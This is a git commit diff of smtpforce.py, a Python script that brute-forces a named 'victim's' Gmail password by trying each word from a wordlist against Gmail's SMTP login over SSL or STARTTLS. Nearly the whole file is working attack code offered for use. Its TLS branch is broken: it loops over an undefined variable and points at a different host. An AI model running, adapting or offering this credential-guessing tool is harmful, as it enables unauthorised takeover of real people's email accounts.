49ca98753dae6931c5c36e3ab8e15f0e29e63867
oguzhan <oguzhan@oguzhans-MacBook-Air.local>
2019-08-25 22:04:22 +0300

    tls protocol is failed

--- smtpforce.py
+++ smtpforce.py
@@ -1,23 +1,81 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
-import sys
-import os
 import smtplib
+import string
+## from itertools import combinations, permutations
 
-smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
-smtpserver.ehlo()
-smtpserver.starttls()
+# ---------------------------------------------------------------------------- #
+#                              tls is failed                                   #
+# ---------------------------------------------------------------------------- #
 
-user = raw_input("email address: ")
-passwfile = raw_input("passwfile: ")
-passwfile = open(passwfile, "r")
+def trial_without_ssl(mail_user, mail_pass): 
+    print("[+] trial_without_ssl function is running...")
+    smtp = smtplib.SMTP("smtp.google.com", 587)
+    smtp.ehlo()
+    smtp.starttls()
+    
+    #doesnt have to manually close file
+    with open(mail_pass, 'r') as f:
+        file_contents = f.read()
+    
+    words = file_contents.split(' ')
+     
+    for password in opf:
+        try:
+            smtp.login(mail_user, password)
+            print("password for "+ mail_user + " is " + password)
+            return True
+        except smtplib.SMTPAuthenticationError:
+            print(password + " is incorrect")
+    smtp.close()
 
-for password in passwfile:
-    try:
-        smtpserver.login(user, password)
+# ---------------------------------------------------------------------------- #
+#                                 ssl is passed                                #
+# ---------------------------------------------------------------------------- #
 
-        print("[+] Password Found: %s" % password)
-        break
-    except smtplib.SMTPAuthenticationError:
-        print("[!] Password Incorrect: %s" % password)
+def trial_with_ssl(mail_user, mail_pass):
+    print("[+] trial_with_ssl function is running...")
+    server_ssl = smtplib.SMTP_SSL("smtp.gmail.com", 465)
+    server_ssl.ehlo()  ## optional, called by login()
+
+    #doesnt have to manually close file
+    with open(mail_pass, 'r') as f:
+        file_contents = f.read()
+        
+    words = file_contents.split(' ')
+    
+    for password in words:
+        try:
+            server_ssl.login(mail_user, password)
+            print("password for " + mail_user + " is " + password)
+            return True
+        except smtplib.SMTPAuthenticationError:
+            print(password + " is incorrect")
+    server_ssl.close()
+
+# ---------------------------------------------------------------------------- #
+#                                 MAIN FUNCTION                                #
+# ---------------------------------------------------------------------------- #
+
+def main():
+    print(' ')
+    print('#### -*-  github.com/oguzhanlarca/smtplib-bruteforce/smtpforce.py -*- ####')
+    print('--------------------------------------------------------------------------')
+        
+    mail_user = str(input("Victim's e-mail: "))
+    mail_pass = str(input("Wordlist name: "))
+    
+    mail_ssl = "ssl"
+    mail_ssl = str(input("Protocol (ssl/tls): "))
+    if mail_ssl == "ssl":
+        trial_with_ssl(mail_user, mail_pass)
+    elif mail_ssl == "tls":
+        trial_without_ssl(mail_user, mail_pass)
+    else:
+        print("cannot be blank")
+       
+       
+        
+if __name__ == "__main__":
+  main()
